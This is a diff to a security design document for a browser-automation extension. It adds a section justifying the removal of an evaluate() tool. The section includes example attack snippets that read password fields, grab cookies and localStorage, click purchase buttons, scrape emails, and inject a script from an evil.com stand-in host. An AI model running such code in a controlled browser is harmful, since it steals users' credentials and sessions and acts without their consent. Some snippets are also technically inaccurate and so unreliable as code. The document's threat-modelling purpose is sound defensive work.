@@ -98,7 +98,78 @@ Session B (origin: https://app2.com)
 | Extension → Server | ❌ HIGH - Extension connects to arbitrary URLs |
 | Server → Page → Extension | ✅ NONE - Extension never connects to network |
 
-### 5. Permission Model by Action Type
+### 5. No Arbitrary JavaScript Execution
+
+**Rule**: The `evaluate()` tool is REMOVED from the system.
+
+**Security Risk - Why evaluate() is Dangerous**:
+
+Even with permission system, arbitrary JavaScript execution enables catastrophic attacks:
+
+1. **Credential Theft**
+   ```javascript
+   evaluate(() => {
+     return document.querySelectorAll('input[type=password]').values();
+   })
+   // Steals password fields from any site
+   ```
+
+2. **Session Hijacking**
+   ```javascript
+   evaluate(() => {
+     return document.cookie + localStorage.toString();
+   })
+   // Exfiltrates authentication tokens
+   ```
+
+3. **User Impersonation**
+   ```javascript
+   evaluate(() => {
+     document.querySelector('#buy-button').click();
+     document.querySelector('#confirm-purchase').click();
+   })
+   // Makes unauthorized purchases
+   ```
+
+4. **Data Exfiltration**
+   ```javascript
+   evaluate(() => {
+     return Array.from(document.querySelectorAll('.email')).map(e => e.textContent);
+   })
+   // Steals all email addresses from page
+   ```
+
+5. **Persistent XSS**
+   ```javascript
+   evaluate(() => {
+     const script = document.createElement('script');
+     script.src = 'https://evil.com/malware.js';
+     document.body.appendChild(script);
+   })
+   // Injects persistent malware
+   ```
+
+**Why Permission System Isn't Enough**:
+- User grants permission thinking it's for legitimate automation
+- Malicious controller uses evaluate() to execute arbitrary code
+- Single permission grant → Complete page compromise
+- No way to audit what JavaScript will be executed
+
+**Safe Alternatives**:
+- ✅ `click()` - Specific, auditable action
+- ✅ `type()` - Specific text input, visible in permission dialog
+- ✅ `snapshot()` - Read-only, structured data
+- ✅ `navigate()` - URL visible in permission dialog
+
+**Defense in Depth**:
+1. evaluate() removed from AI SDK tools ✅
+2. evaluate() removed from sensitive actions list ✅
+3. Even if a custom client tries to use it, permission system would block
+4. Documented as security risk ✅
+
+**Conclusion**: Arbitrary JavaScript execution is fundamentally incompatible with the security model. Use specific, auditable tools instead.
+
+### 6. Permission Model by Action Type
 
 #### URL-based Actions (navigate, createTab)
 
@@ -394,10 +465,12 @@ The security model ensures:
 - ✅ **Explicit permission** - User approves all sensitive actions
 - ✅ **Tab isolation** - Sessions only access their own tabs
 - ✅ **No SSRF risk** - Extension never connects to arbitrary URLs
+- ✅ **No arbitrary JS execution** - evaluate() tool removed to prevent XSS
 - ✅ **Origin validation** - Content script verifies request origin
 - ✅ **Secure UI** - Permission dialogs isolated from page
 - ✅ **Scoped policies** - "Always allow" per controller-target pair
+- ✅ **Debug logging** - Persistent debug logs for troubleshooting (last 1000 entries)
 
-This prevents unauthorized access, privilege escalation, cross-origin attacks, and SSRF attacks while maintaining usability through smart permission policies.
+This prevents unauthorized access, privilege escalation, cross-origin attacks, SSRF attacks, and XSS vulnerabilities while maintaining usability through smart permission policies.
 
-**Production Readiness**: With Tier 1 security measures implemented, the system is ready for production deployment.
+**Production Readiness**: With Tier 1 security measures implemented and evaluate() removed, the system is ready for production deployment.
